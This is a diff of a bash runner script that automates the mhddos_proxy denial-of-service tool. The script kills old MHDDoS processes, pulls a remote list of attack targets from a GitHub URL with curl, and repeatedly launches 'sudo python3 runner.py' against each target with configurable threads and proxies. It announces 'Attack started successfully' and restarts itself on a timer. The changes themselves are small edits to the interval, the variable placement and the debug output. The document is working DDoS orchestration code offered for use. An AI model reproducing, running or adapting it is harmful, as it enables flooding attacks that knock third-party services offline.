@@ -1,8 +1,8 @@
 #!/bin/bash
 
-restart_interval=3m
+restart_interval=10m
 
-num_of_copies="${1:-1}"
+
 
 #Just in case kill previous copy of mhddos_proxy
 echo "Killing all old processes with MHDDoS"
@@ -14,6 +14,8 @@ echo -e "\n\033[0;35mAll old processes with MHDDoS killed\033[0;0m\n"
 #sudo docker kill $(sudo docker ps -aqf ancestor=ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest)
 #echo "Docker useless containers killed"
 
+
+num_of_copies="${1:-1}"
 threads="${2:-500}"
 if ((threads < 100));
 then
@@ -33,6 +35,7 @@ if [ "${debug}" != "--debug" ] && [ "${debug}" != "" ];
 then
 	debug="--debug"
 fi
+echo -e "\n\ndebug: $debug\n\n"
 
 
 
@@ -59,7 +62,7 @@ do
 		bash runner.sh $num_of_copies $threads $proxy_interval $debug&
 		exit
 	fi
-	#clear
+	clear
    	
    	# Get number of targets in runner_targets. First 5 strings ommited, those are reserved as comments.
    	list_size=$(curl -s https://raw.githubusercontent.com/alexnest-ua/auto_mhddos_test/main/runner_targets | cat | grep "^[^#]" | wc -l)
@@ -96,7 +99,7 @@ do
             
             cd ~/mhddos_proxy
             #sudo docker run -d -it --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest $cmd_line $proxy_interval $rpc
-            sudo python3 runner.py $cmd_line $proxy_interval $rpc $threads $debug&
+            sudo python3 runner.py $cmd_line $proxy_interval $rpc $threads $debug &
             echo -e "\n\033[42mAttack started successfully\033[0m\n"
    	done
 	echo -e "\033[0;34m#####################################\033[0;0m\n"
